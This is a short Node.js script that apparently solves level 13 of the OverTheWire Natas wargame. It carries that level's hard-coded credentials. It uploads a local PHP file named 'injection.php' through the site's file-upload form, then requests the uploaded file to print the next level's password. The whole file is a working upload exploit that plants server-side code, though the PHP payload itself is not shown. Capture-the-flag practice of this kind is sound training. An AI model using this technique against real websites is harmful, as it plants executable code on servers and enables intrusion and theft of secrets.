let username = 'natas13';
let password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY';


const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

const injection = __dirname + '/injection.php';

let options = {
    uri: `http://${username}.natas.labs.overthewire.org`,
    method: 'POST',
    formData: {
        filename: injection,
        uploadedfile: {
            value: fs.createReadStream(injection),
            options: {
                filename: injection
            }
        }
    }
}

rp(options)
    .auth(username, password)
    .then(($) => {
        showFile($('a').attr('href'));
});


function showFile(url){
    rp(options.uri + '/' + url)
        .auth(username, password)
        .then(($) => {
            console.log( 
                $('#password').text().trim()
            );
        });
}